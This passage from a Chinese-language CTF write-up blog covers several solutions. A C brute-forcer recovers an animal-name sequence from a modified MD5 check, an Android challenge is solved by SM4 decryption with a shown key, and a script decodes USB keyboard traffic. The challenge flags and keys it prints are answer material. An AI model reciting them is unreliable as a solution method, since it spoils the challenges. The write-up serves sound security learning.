class="hljs-number">4</span>;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Decode</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *output,<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *input,<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> len)</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>,j = <span class="hljs-number">0</span>;<br>     <span class="hljs-keyword">while</span>(j &lt; len)<br>     &#123;<br>           output[i] = (input[j]) |<br>                       (input[j+<span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">8</span>) |<br>                       (input[j+<span class="hljs-number">2</span>] &lt;&lt; <span class="hljs-number">16</span>) |<br>                       (input[j+<span class="hljs-number">3</span>] &lt;&lt; <span class="hljs-number">24</span>);<br>           i++;<br>           j+=<span class="hljs-number">4</span>; <br>     &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">MD5Transform</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> state[<span class="hljs-number">4</span>],<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> block[<span class="hljs-number">64</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a = state[<span class="hljs-number">0</span>];<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> b = state[<span class="hljs-number">1</span>];<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> c = state[<span class="hljs-number">2</span>];<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> d = state[<span class="hljs-number">3</span>];<br>     <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> x[<span class="hljs-number">64</span>];<br>     <span class="hljs-built_in">MD5Decode</span>(x,block,<span class="hljs-number">64</span>);<br>     <span class="hljs-built_in">FF</span>(a, b, c, d, x[ <span class="hljs-number">0</span>], <span class="hljs-number">7</span>, <span class="hljs-number">0xd76aa478</span>); <span class="hljs-comment">/* 1 */</span><br> <span class="hljs-built_in">FF</span>(d, a, b, c, x[ <span class="hljs-number">1</span>], <span class="hljs-number">12</span>, <span class="hljs-number">0xe8c7b756</span>); <span class="hljs-comment">/* 2 */</span><br> <span class="hljs-built_in">FF</span>(c, d, a, b, x[ <span class="hljs-number">2</span>], <span class="hljs-number">17</span>, <span class="hljs-number">0x242070db</span>); <span class="hljs-comment">/* 3 */</span><br> <span class="hljs-built_in">FF</span>(b, c, d, a, x[ <span class="hljs-number">3</span>], <span class="hljs-number">22</span>, <span class="hljs-number">0xc1bdceee</span>); <span class="hljs-comment">/* 4 */</span><br> <span class="hljs-built_in">FF</span>(a, b, c, d, x[ <span class="hljs-number">4</span>], <span class="hljs-number">7</span>, <span class="hljs-number">0xf57c0faf</span>); <span class="hljs-comment">/* 5 */</span><br> <span class="hljs-built_in">FF</span>(d, a, b, c, x[ <span class="hljs-number">5</span>], <span class="hljs-number">12</span>, <span class="hljs-number">0x4787c62a</span>); <span class="hljs-comment">/* 6 */</span><br> <span class="hljs-built_in">FF</span>(c, d, a, b, x[ <span class="hljs-number">6</span>], <span class="hljs-number">17</span>, <span class="hljs-number">0xa8304613</span>); <span class="hljs-comment">/* 7 */</span><br> <span class="hljs-built_in">FF</span>(b, c, d, a, x[ <span class="hljs-number">7</span>], <span class="hljs-number">22</span>, <span class="hljs-number">0xfd469501</span>); <span class="hljs-comment">/* 8 */</span><br> <span class="hljs-built_in">FF</span>(a, b, c, d, x[ <span class="hljs-number">8</span>], <span class="hljs-number">7</span>, <span class="hljs-number">0x698098d8</span>); <span class="hljs-comment">/* 9 */</span><br> <span class="hljs-built_in">FF</span>(d, a, b, c, x[ <span class="hljs-number">9</span>], <span class="hljs-number">12</span>, <span class="hljs-number">0x8b44f7af</span>); <span class="hljs-comment">/* 10 */</span><br> <span class="hljs-built_in">FF</span>(c, d, a, b, x[<span class="hljs-number">10</span>], <span class="hljs-number">17</span>, <span class="hljs-number">0xffff5bb1</span>); <span class="hljs-comment">/* 11 */</span><br> <span class="hljs-built_in">FF</span>(b, c, d, a, x[<span class="hljs-number">11</span>], <span class="hljs-number">22</span>, <span class="hljs-number">0x895cd7be</span>); <span class="hljs-comment">/* 12 */</span><br> <span class="hljs-built_in">FF</span>(a, b, c, d, x[<span class="hljs-number">12</span>], <span class="hljs-number">7</span>, <span class="hljs-number">0x6b901122</span>); <span class="hljs-comment">/* 13 */</span><br> <span class="hljs-built_in">FF</span>(d, a, b, c, x[<span class="hljs-number">13</span>], <span class="hljs-number">12</span>, <span class="hljs-number">0xfd987193</span>); <span class="hljs-comment">/* 14 */</span><br> <span class="hljs-built_in">FF</span>(c, d, a, b, x[<span class="hljs-number">14</span>], <span class="hljs-number">17</span>, <span class="hljs-number">0xa679438e</span>); <span class="hljs-comment">/* 15 */</span><br> <span class="hljs-built_in">FF</span>(b, c, d, a, x[<span class="hljs-number">15</span>], <span class="hljs-number">22</span>, <span class="hljs-number">0x49b40821</span>); <span class="hljs-comment">/* 16 */</span><br> <br> <span class="hljs-comment">/* Round 2 */</span><br> <span class="hljs-built_in">GG</span>(a, b, c, d, x[ <span class="hljs-number">1</span>], <span class="hljs-number">5</span>, <span class="hljs-number">0xf61e2562</span>); <span class="hljs-comment">/* 17 */</span><br> <span class="hljs-built_in">GG</span>(d, a, b, c, x[ <span class="hljs-number">6</span>], <span class="hljs-number">9</span>, <span class="hljs-number">0xc040b340</span>); <span class="hljs-comment">/* 18 */</span><br> <span class="hljs-built_in">GG</span>(c, d, a, b, x[<span class="hljs-number">11</span>], <span class="hljs-number">14</span>, <span class="hljs-number">0x265e5a51</span>); <span class="hljs-comment">/* 19 */</span><br> <span class="hljs-built_in">GG</span>(b, c, d, a, x[ <span class="hljs-number">0</span>], <span class="hljs-number">20</span>, <span class="hljs-number">0xe9b6c7aa</span>); <span class="hljs-comment">/* 20 */</span><br> <span class="hljs-built_in">GG</span>(a, b, c, d, x[ <span class="hljs-number">5</span>], <span class="hljs-number">5</span>, <span class="hljs-number">0xd62f105d</span>); <span class="hljs-comment">/* 21 */</span><br> <span class="hljs-built_in">GG</span>(d, a, b, c, x[<span class="hljs-number">10</span>], <span class="hljs-number">9</span>,  <span class="hljs-number">0x2441453</span>); <span class="hljs-comment">/* 22 */</span><br> <span class="hljs-built_in">GG</span>(c, d, a, b, x[<span class="hljs-number">15</span>], <span class="hljs-number">14</span>, <span class="hljs-number">0xd8a1e681</span>); <span class="hljs-comment">/* 23 */</span><br> <span class="hljs-built_in">GG</span>(b, c, d, a, x[ <span class="hljs-number">4</span>], <span class="hljs-number">20</span>, <span class="hljs-number">0xe7d3fbc8</span>); <span class="hljs-comment">/* 24 */</span><br> <span class="hljs-built_in">GG</span>(a, b, c, d, x[ <span class="hljs-number">9</span>], <span class="hljs-number">5</span>, <span class="hljs-number">0x21e1cde6</span>); <span class="hljs-comment">/* 25 */</span><br> <span class="hljs-built_in">GG</span>(d, a, b, c, x[<span class="hljs-number">14</span>], <span class="hljs-number">9</span>, <span class="hljs-number">0xc33707d6</span>); <span class="hljs-comment">/* 26 */</span><br> <span class="hljs-built_in">GG</span>(c, d, a, b, x[ <span class="hljs-number">3</span>], <span class="hljs-number">14</span>, <span class="hljs-number">0xf4d50d87</span>); <span class="hljs-comment">/* 27 */</span><br> <span class="hljs-built_in">GG</span>(b, c, d, a, x[ <span class="hljs-number">8</span>], <span class="hljs-number">20</span>, <span class="hljs-number">0x455a14ed</span>); <span class="hljs-comment">/* 28 */</span><br> <span class="hljs-built_in">GG</span>(a, b, c, d, x[<span class="hljs-number">13</span>], <span class="hljs-number">5</span>, <span class="hljs-number">0xa9e3e905</span>); <span class="hljs-comment">/* 29 */</span><br> <span class="hljs-built_in">GG</span>(d, a, b, c, x[ <span class="hljs-number">2</span>], <span class="hljs-number">9</span>, <span class="hljs-number">0xfcefa3f8</span>); <span class="hljs-comment">/* 30 */</span><br> <span class="hljs-built_in">GG</span>(c, d, a, b, x[ <span class="hljs-number">7</span>], <span class="hljs-number">14</span>, <span class="hljs-number">0x676f02d9</span>); <span class="hljs-comment">/* 31 */</span><br> <span class="hljs-built_in">GG</span>(b, c, d, a, x[<span class="hljs-number">12</span>], <span class="hljs-number">20</span>, <span class="hljs-number">0x8d2a4c8a</span>); <span class="hljs-comment">/* 32 */</span><br> <br> <span class="hljs-comment">/* Round 3 */</span><br> <span class="hljs-built_in">HH</span>(a, b, c, d, x[ <span class="hljs-number">5</span>], <span class="hljs-number">4</span>, <span class="hljs-number">0xfffa3942</span>); <span class="hljs-comment">/* 33 */</span><br> <span class="hljs-built_in">HH</span>(d, a, b, c, x[ <span class="hljs-number">8</span>], <span class="hljs-number">11</span>, <span class="hljs-number">0x8771f681</span>); <span class="hljs-comment">/* 34 */</span><br> <span class="hljs-built_in">HH</span>(c, d, a, b, x[<span class="hljs-number">11</span>], <span class="hljs-number">16</span>, <span class="hljs-number">0x6d9d6122</span>); <span class="hljs-comment">/* 35 */</span><br> <span class="hljs-built_in">HH</span>(b, c, d, a, x[<span class="hljs-number">14</span>], <span class="hljs-number">23</span>, <span class="hljs-number">0xfde5380c</span>); <span class="hljs-comment">/* 36 */</span><br> <span class="hljs-built_in">HH</span>(a, b, c, d, x[ <span class="hljs-number">1</span>], <span class="hljs-number">4</span>, <span class="hljs-number">0xa4beea44</span>); <span class="hljs-comment">/* 37 */</span><br> <span class="hljs-built_in">HH</span>(d, a, b, c, x[ <span class="hljs-number">4</span>], <span class="hljs-number">11</span>, <span class="hljs-number">0x4bdecfa9</span>); <span class="hljs-comment">/* 38 */</span><br> <span class="hljs-built_in">HH</span>(c, d, a, b, x[ <span class="hljs-number">7</span>], <span class="hljs-number">16</span>, <span class="hljs-number">0xf6bb4b60</span>); <span class="hljs-comment">/* 39 */</span><br> <span class="hljs-built_in">HH</span>(b, c, d, a, x[<span class="hljs-number">10</span>], <span class="hljs-number">23</span>, <span class="hljs-number">0xbebfbc70</span>); <span class="hljs-comment">/* 40 */</span><br> <span class="hljs-built_in">HH</span>(a, b, c, d, x[<span class="hljs-number">13</span>], <span class="hljs-number">4</span>, <span class="hljs-number">0x289b7ec6</span>); <span class="hljs-comment">/* 41 */</span><br> <span class="hljs-built_in">HH</span>(d, a, b, c, x[ <span class="hljs-number">0</span>], <span class="hljs-number">11</span>, <span class="hljs-number">0xeaa127fa</span>); <span class="hljs-comment">/* 42 */</span><br> <span class="hljs-built_in">HH</span>(c, d, a, b, x[ <span class="hljs-number">3</span>], <span class="hljs-number">16</span>, <span class="hljs-number">0xd4ef3085</span>); <span class="hljs-comment">/* 43 */</span><br> <span class="hljs-built_in">HH</span>(b, c, d, a, x[ <span class="hljs-number">6</span>], <span class="hljs-number">23</span>,  <span class="hljs-number">0x4881d05</span>); <span class="hljs-comment">/* 44 */</span><br> <span class="hljs-built_in">HH</span>(a, b, c, d, x[ <span class="hljs-number">9</span>], <span class="hljs-number">4</span>, <span class="hljs-number">0xd9d4d039</span>); <span class="hljs-comment">/* 45 */</span><br> <span class="hljs-built_in">HH</span>(d, a, b, c, x[<span class="hljs-number">12</span>], <span class="hljs-number">11</span>, <span class="hljs-number">0xe6db99e5</span>); <span class="hljs-comment">/* 46 */</span><br> <span class="hljs-built_in">HH</span>(c, d, a, b, x[<span class="hljs-number">15</span>], <span class="hljs-number">16</span>, <span class="hljs-number">0x1fa27cf8</span>); <span class="hljs-comment">/* 47 */</span><br> <span class="hljs-built_in">HH</span>(b, c, d, a, x[ <span class="hljs-number">2</span>], <span class="hljs-number">23</span>, <span class="hljs-number">0xc4ac5665</span>); <span class="hljs-comment">/* 48 */</span><br> <br> <span class="hljs-comment">/* Round 4 */</span><br> <span class="hljs-built_in">II</span>(a, b, c, d, x[ <span class="hljs-number">0</span>], <span class="hljs-number">6</span>, <span class="hljs-number">0xf4292244</span>); <span class="hljs-comment">/* 49 */</span><br> <span class="hljs-built_in">II</span>(d, a, b, c, x[ <span class="hljs-number">7</span>], <span class="hljs-number">10</span>, <span class="hljs-number">0x432aff97</span>); <span class="hljs-comment">/* 50 */</span><br> <span class="hljs-built_in">II</span>(c, d, a, b, x[<span class="hljs-number">14</span>], <span class="hljs-number">15</span>, <span class="hljs-number">0xab9423a7</span>); <span class="hljs-comment">/* 51 */</span><br> <span class="hljs-built_in">II</span>(b, c, d, a, x[ <span class="hljs-number">5</span>], <span class="hljs-number">21</span>, <span class="hljs-number">0xfc93a039</span>); <span class="hljs-comment">/* 52 */</span><br> <span class="hljs-built_in">II</span>(a, b, c, d, x[<span class="hljs-number">12</span>], <span class="hljs-number">6</span>, <span class="hljs-number">0x655b59c3</span>); <span class="hljs-comment">/* 53 */</span><br> <span class="hljs-built_in">II</span>(d, a, b, c, x[ <span class="hljs-number">3</span>], <span class="hljs-number">10</span>, <span class="hljs-number">0x8f0ccc92</span>); <span class="hljs-comment">/* 54 */</span><br> <span class="hljs-built_in">II</span>(c, d, a, b, x[<span class="hljs-number">10</span>], <span class="hljs-number">15</span>, <span class="hljs-number">0xffeff47d</span>); <span class="hljs-comment">/* 55 */</span><br> <span class="hljs-built_in">II</span>(b, c, d, a, x[ <span class="hljs-number">1</span>], <span class="hljs-number">21</span>, <span class="hljs-number">0x85845dd1</span>); <span class="hljs-comment">/* 56 */</span><br> <span class="hljs-built_in">II</span>(a, b, c, d, x[ <span class="hljs-number">8</span>], <span class="hljs-number">6</span>, <span class="hljs-number">0x6fa87e4f</span>); <span class="hljs-comment">/* 57 */</span><br> <span class="hljs-built_in">II</span>(d, a, b, c, x[<span class="hljs-number">15</span>], <span class="hljs-number">10</span>, <span class="hljs-number">0xfe2ce6e0</span>); <span class="hljs-comment">/* 58 */</span><br> <span class="hljs-built_in">II</span>(c, d, a, b, x[ <span class="hljs-number">6</span>], <span class="hljs-number">15</span>, <span class="hljs-number">0xa3014314</span>); <span class="hljs-comment">/* 59 */</span><br> <span class="hljs-built_in">II</span>(b, c, d, a, x[<span class="hljs-number">13</span>], <span class="hljs-number">21</span>, <span class="hljs-number">0x4e0811a1</span>); <span class="hljs-comment">/* 60 */</span><br> <span class="hljs-built_in">II</span>(a, b, c, d, x[ <span class="hljs-number">4</span>], <span class="hljs-number">6</span>, <span class="hljs-number">0xf7537e82</span>); <span class="hljs-comment">/* 61 */</span><br> <span class="hljs-built_in">II</span>(d, a, b, c, x[<span class="hljs-number">11</span>], <span class="hljs-number">10</span>, <span class="hljs-number">0xbd3af235</span>); <span class="hljs-comment">/* 62 */</span><br> <span class="hljs-built_in">II</span>(c, d, a, b, x[ <span class="hljs-number">2</span>], <span class="hljs-number">15</span>, <span class="hljs-number">0x2ad7d2bb</span>); <span class="hljs-comment">/* 63 */</span><br> <span class="hljs-built_in">II</span>(b, c, d, a, x[ <span class="hljs-number">9</span>], <span class="hljs-number">21</span>, <span class="hljs-number">0xeb86d391</span>); <span class="hljs-comment">/* 64 */</span><br>     state[<span class="hljs-number">0</span>] += a;<br>     state[<span class="hljs-number">1</span>] += b;<br>     state[<span class="hljs-number">2</span>] += c;<br>     state[<span class="hljs-number">3</span>] += d;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里对加密结果进行了处理，调试发现他加密的结果就是我们选择的动物的全称，比如说我们选择1则加密dog。所以程序逻辑就是用动物名字加密，然后变异的md5加密后和密文比较，如果比较成功就是对的动物名字，用这个名字的序号再加密md5，最后写exp爆破。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;md5.c&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> status;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> selemtype;<br><span class="hljs-type">char</span> choices[][<span class="hljs-number">10</span>] = &#123;<br>    <span class="hljs-string">&quot;cat&quot;</span>,<br>    <span class="hljs-string">&quot;dog&quot;</span>,<br>    <span class="hljs-string">&quot;fox&quot;</span>,<br>    <span class="hljs-string">&quot;panda&quot;</span>,<br>    <span class="hljs-string">&quot;dragon&quot;</span>,<br>    <span class="hljs-string">&quot;monkey&quot;</span><br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> answer[] = &#123;<br>    <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0x85</span>,<br>    <span class="hljs-number">0x46</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x18</span><br>&#125;;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span> <span class="hljs-params">()</span> </span>&#123;<br>    MD5_CTX md5;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> md5_str[<span class="hljs-number">32</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> length = <span class="hljs-number">9</span>;  <br><br>    <span class="hljs-type">int</span> choice[length]; <br><br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>        choice[i] = <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-type">char</span> animalName[length * <span class="hljs-number">10</span> + <span class="hljs-number">1</span>];  <br>        <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; length; i++) &#123;<br>            <span class="hljs-type">int</span> choiceIndex = choice[i];<br>            <span class="hljs-type">char</span> *animal = choices[choiceIndex];<br>            <span class="hljs-keyword">while</span> (*animal != <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;<br>                animalName[index] = *animal;<br>                animal++;<br>                index++;<br>            &#125;<br>        &#125;<br>        animalName[index] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">16</span> ; i ++ )<br>        &#123;<br>            md5_str[i]=<span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-built_in">MD5Init</span>(&amp;md5);<br>        <span class="hljs-built_in">MD5Update</span>(&amp;md5, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)animalName, <span class="hljs-built_in">strlen</span>((<span class="hljs-type">char</span> *)animalName));<br>        <span class="hljs-built_in">MD5Final</span>(&amp;md5, (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)md5_str);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">16</span> ; i ++ ) &#123;<br>            md5_str[i] = (md5_str[i] &amp; <span class="hljs-number">0xE9</span> | ~md5_str[i] &amp; <span class="hljs-number">0x16</span>);<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i &lt; <span class="hljs-number">16</span> ; i ++ )<br>        &#123;<br>            <span class="hljs-keyword">if</span>(md5_str[i]!=answer[i])<br>            &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">5</span>)<br>            &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>,animalName);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>            &#125;<br>        &#125;<br>            <br>        <br>        <span class="hljs-type">int</span> i = length - <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">while</span> (i &gt;= <span class="hljs-number">0</span> &amp;&amp; choice[i] == <span class="hljs-number">5</span>) &#123;<br>            choice[i] = <span class="hljs-number">0</span>;<br>            i--;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        choice[i]++;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-comment">//catmonkeydogdragondogcatfoxpandapanda</span><br><span class="hljs-comment">//051410233</span><br></code></pre></td></tr></table></figure><p>找出相应序号然后md5加密套上flag{}即可<br><code>flag&#123;839c998c52db6618bb24c346b85a894f&#125;</code></p><h3 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h3><p>用jadx分析无果，解压去分析so层文件，在<code>libjniex.so</code>发现<code>decrypt</code>函数<br><img src="/mdimg/2023hwsummer/9.png"><br>跟进去发现为SM4密码，并发现密文。<br><img src="/mdimg/2023hwsummer/10.png"><br>装不了模拟器，手机安装运行APK文件即可看到key:<code>159762dr7vh438sa</code>iv:<code>1313131313131313</code><br><img src="/mdimg/2023hwsummer/11.jpeg"><br><img src="/mdimg/2023hwsummer/12.jpeg"><br>赛博厨子直接SM4解密就可以。<br><img src="/mdimg/2023hwsummer/13.png"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DCIC2023</title>
    <link href="/2023/04/23/DCIC2023/"/>
    <url>/2023/04/23/DCIC2023/</url>
    
    <content type="html"><![CDATA[<h2 id="数据安全"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全</h2><h3 id="ezusb"><a href="#ezusb" class="headerlink" title="ezusb"></a>ezusb</h3><p>一眼顶针 键盘流量<br>数据是HID Data 所以要抓取usbhid.data    <code>sed &#39;/^\s*$/d&#39;</code>  是去除空行，因为流量包里面有HID Data 为空1的数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;usbdata.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>fi=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>   a=f.readline().strip()<br>   <span class="hljs-keyword">if</span> a:<br>       <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(a)== <span class="hljs-number">16</span>: <span class="hljs-comment"># 鼠标流量的话 len 改为 8</span><br>          out=<span class="hljs-string">&#x27;&#x27;</span><br>          <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(a),<span class="hljs-number">2</span>):<br>              <span class="hljs-keyword">if</span> i+<span class="hljs-number">2</span> != <span class="hljs-built_in">len</span>(a):<br>                  out+=a[i]+a[i+<span class="hljs-number">1</span>]+<span class="hljs-string">&quot;:&quot;</span><br>              <span class="hljs-keyword">else</span>:<br>                 out+=a[i]+a[i+<span class="hljs-number">1</span>]<br>          fi.write(out)<br>          fi.write(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>   <span class="hljs-keyword">else</span>:<br>       <span class="hljs-keyword">break</span><br>fi.close()<br></code></pre></td></tr></table></figure><p>脚本解析数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>: <span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>: <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>: <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>: <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>: <span 